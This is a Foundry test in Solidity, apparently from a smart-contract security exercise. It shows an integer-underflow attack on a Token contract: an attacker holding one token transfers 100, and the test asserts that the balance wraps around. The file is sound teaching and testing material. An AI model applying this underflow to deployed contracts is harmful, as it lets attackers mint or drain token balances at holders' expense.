// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.7.6;
pragma abicoder v2;

import {Test} from "forge-std/Test.sol";
import {Token} from "../../src/Overflow/Token.sol";

contract TokenTest is Test {
    Token public token;

    address _attacker = address(1);

    function setUp() public {
        token = new Token();
    }

    function test_Attack() public {
        token.transfer(_attacker, 1);

        uint256 transferAmount = 100;
        uint256 attackerBalanceBefore = token.balances(_attacker);

        vm.prank(_attacker);
        token.transfer(address(this), transferAmount);
        //vm.expectRevert();

        uint256 attackerBalanceAfter = token.balances(_attacker);

        assert(attackerBalanceAfter == attackerBalanceBefore - transferAmount);
    }
}